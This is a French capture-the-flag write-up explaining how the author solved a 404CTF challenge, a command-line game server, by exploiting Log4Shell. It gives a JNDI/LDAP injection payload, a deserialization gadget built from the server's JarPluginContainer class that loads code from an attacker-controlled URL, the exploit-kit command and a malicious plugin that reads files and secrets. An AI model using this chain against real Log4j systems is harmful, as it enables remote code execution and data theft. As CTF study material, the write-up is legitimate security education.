# Misc / Joutes, Arches, Vallées et Arbalètes
Points: 1000
Difficulté: Extrême

# Énoncé
Bonjour agent.

Le groupe Hallebarde semble avoir lancé une campagne de recrutement et vise des scientifiques.

Nous sommes parvenus à identifier une de leur méthodes : ils ont mis au point un jeu vidéo multijoueur en ligne de commande leur permettant de sélectionner les meilleurs éléments. Peut-être sont-ils nostalgiques des années 80. Nous avons identifié une adresse hébergeant une instance de ce serveur de jeu, vous pouvez vous y connecter à l'aide des informations ci-dessous.
Par ailleurs, les renseignements humains ont réussi à mettre la main sur une clef USB contenant de la documentation de ce programme, nous vous la mettons à disposition.

Pouvez-vous investiguer ce service et voir s'il est possible de le compromettre et d'en tirer des informations sensibles ?

Auteur : Smyler#7078

`nc challenge.404ctf.fr 31579`

Fichiers fournis: RecrumentGameSDK.zip

# Première analyse
En se connectant au challenge, on est accueilli par un jeu textuel assez basique. Il y a différentes pièces, objets et personnage. Un des personnages demande le flag. Le jeu est court à faire le tour et je me dis vite qu'il doit s'agir d'autre chose.
Lors de la partie, on remarque qu'on reçoit des logs en plus en des retours de base de l'application. Cette observation ainsi que le SDK en Java fourni m'a fait penser à log4shell.

Cela se vérifie en entrant comme nom d'utilisateur `${java:runtime}` ce qui nous donne  `OpenJDK Runtime Environment (build 17.0.3+7-Ubuntu-0ubuntu0.18.04.1) from Private Build` dans les logs.
Maintenant que l'on a une piste d'exploitation il va me falloir comprendre exactement comment fonctionne cette attaque.

# Exploitation
## Log4Shell (CVE-2021-44228)
> Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

Donc on peut executer du code héberger depuis un LDAP et donc potentiellement trouver le flag de cette manière. Il nous faut donc un serveur LDAP pour renvoyer le bytecode Java à injecter ainsi que le payload à donner à l'application. Le payload est très simplement et nécessite uniquement l'accès à notre serveur LDAP et peut s'écrire comme cela: `${jndi:ldap://#{IP}:#{PORT}/object}`.

## Recherche d'un gadget

En cherchant un peu je tombe sur cet outil (https://github.com/pimps/JNDI-Exploit-Kit) qui contient pas mal de payload pour exploiter cette faille. Mais en lisant un peu les prérequis (pas toujours bien clair sur le répo) et les comparant à ce que contient le serveur du jeu (fourni dans le SDK), j'en arrive vite à la conclusion qu'aucun payload n'est compatible avec notre challenge. Il nous faut donc trouver un "gadget"; c'est à dire une classe qui une fois désérialisé par Java nous donnera une execution de code. On se concentrant dans le code du serveur, on tombe assez rapidement sur une classe serializable JarPluginContainer.

```java
public class JarPluginContainer extends PluginContainer {

  public void load(Game game) throws CorruptedPluginException, PluginLoadingException {
    URLClassLoader loader = new URLClassLoader(new URL[] { this.url }, getClass().getClassLoader());
    load(game, loader);
    this.loaded = true;
  }

  /* ... */

  private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    if (this.loaded && this.plugin == null)
      try {
        PluginLoader.LOGGER.warn("Deserializing a plugin that does not support serialization, loading it manually!");
        PluginLoader.LOGGER.warn("Offender: " + this.metadata);
        PluginLoader.LOGGER.warn("Please implement serialization in your plugins if you wish to use plugin dumps.");
        load((Game)RecrutementGameLauncher.getGame());
      } catch (PluginLoadingException e) {
        throw new IllegalStateException("Failed to re-load a plugin after deserialization!", e);
      }  
  }
  }
```

La classe dont il hérite:
```java
public abstract class PluginContainer implements Comparable<PluginContainer>, Serializable {
  protected static final Class<Plugin> PLUGIN_CLASS = Plugin.class;

  protected final PluginMetadata metadata;

  protected Plugin plugin;

  public PluginContainer(PluginMetadata metadata) {
    this.metadata = metadata;
  }

  protected void load(Game game, ClassLoader loader) throws CorruptedPluginException, PluginLoadingException {
    try {
      Class<?> clazz = loader.loadClass(this.metadata.mainClass());
      if (!PLUGIN_CLASS.isAssignableFrom(clazz))
        throw new CorruptedPluginException("Class " + clazz + " does not properly implement the plugin interface"); 
      Constructor<?> constructor = clazz.getDeclaredConstructor(new Class[0]);
      this.plugin = (Plugin)constructor.newInstance(new Object[0]);
      this.plugin.onLoad(game, this.metadata, Logger.getLogger(this.metadata.id()));
    } catch (ClassNotFoundException e) {
      throw new CorruptedPluginException("Wrong main plugin class: " + this.metadata.mainClass());
    } catch (NoSuchMethodException e) {
      throw new CorruptedPluginException("Main plugin class " + this.metadata.mainClass() + "does not have an empty constructor and cannot be instantiated");
    } catch (InstantiationException e) {
      throw new CorruptedPluginException("Main plugin class " + this.metadata.mainClass() + " cannot be instantiated");
    } catch (Throwable t) {
      throw new PluginLoadingException("Encountered an exception when instantiating plugin", t);
    } 
  }
```

On note également l'utilisation de URLClassLoader en tant que ClassLoader ce qui nous permet de préciser une URL d'où charger le fichier Java qui nous intéresse. 
Donc il ne nous reste plus qu'à sérialiser une instance de JarPluginContainer avec les valeurs qui nous arrangent: des metadata cohérentes avec la classe à charger après et l'URL qui pointe vers un fichier que l'on contrôle. 
```java
PluginMetadata meta = new PluginMetadata("injected", "Payload", "0.1");
URL url = new URL("http://<IP>:8000/");


JarPluginContainer jpc = new JarPluginContainer(meta, url, true);

writePluginToFile("JarPluginContainer.ser", jpc);
```

## Le jeu est à nous !
Maintenant que nous avons ce fichier, on peut utiliser JNDI-Exploit-Kit pour l'envoyer: `java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -P JarPluginContainer.ser`. L'url menant à ce payload est ${jndi:ldap://<IP>:1389/serial/CustomPayload}. En injectant ce fichier, on reçoit une connexion sur notre serveur HTTP, il ne reste plus qu'à coder un plugin à charger dans le jeu.

```java
    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        instance = this;
        this.metadata = metadata;
        this.logger = logger;

        this.logger.info("Payload started version: " + metadata.version());
    
        game.registerCommand("b64", this::base64file, "Display the base64 of a file");
        game.registerCommand("p", this::plugins, "Manage plugins");
        game.registerCommand("flag", this::flag, "Get the flag");
    }
```
En suivant le SDK ainsi qu'en décompilant le serveur, il est assez simple de coder un plugin en suivant les fonctions attendues. On récupère le call sur onLoad ce qui nous permet d'enregistrer nos fonctions dans le jeu. Ces quelques commandes nous permettent de consulter la liste des plugins et d'en récupérer les fichiers jar. Après analyse du fichier npcs.jar, on découvre que le secret n'est pas dedans mais dans une variable d'environnement ce qui permet de coder une dernière fonction pour le récupérer.

```java
    public void flag(Game game, CommandExecutor commandExecutor, String... strings){
        if (commandExecutor instanceof User user){
            user.sendMessage("Flag: " + System.getProperty("ctf404.flag.cjgJF4GCxj2QD5Lg"));
        }
    }
```
Ce qui nous donne `404CTF{j4v4_3s7_c00l_m41s_zes7_m1euX_Qu4nd_c3z7_z4f3}`.



